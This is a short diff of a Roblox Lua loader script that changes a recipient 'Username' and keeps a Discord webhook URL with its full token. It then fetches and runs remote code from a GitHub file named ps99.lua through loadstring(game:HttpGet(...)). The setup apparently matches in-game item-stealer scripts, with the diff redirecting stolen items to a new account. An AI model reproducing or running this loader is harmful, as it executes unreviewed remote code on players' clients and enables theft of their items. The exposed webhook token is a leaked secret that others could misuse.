@@ -1,4 +1,4 @@
-Username = "ZeatForGun" 
+Username = "ViperGGs1" 
 Webhook = "https://discord.com/api/webhooks/1269573689326960712/SxR956y_qhWUrbZTjIU4VChlR0FjLFZLHsGOlqb6ujhZJZz375PNXqaVWzK-WLqbpvH_" 
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/zachemzhestokiy/x/main/ps99.lua"))()
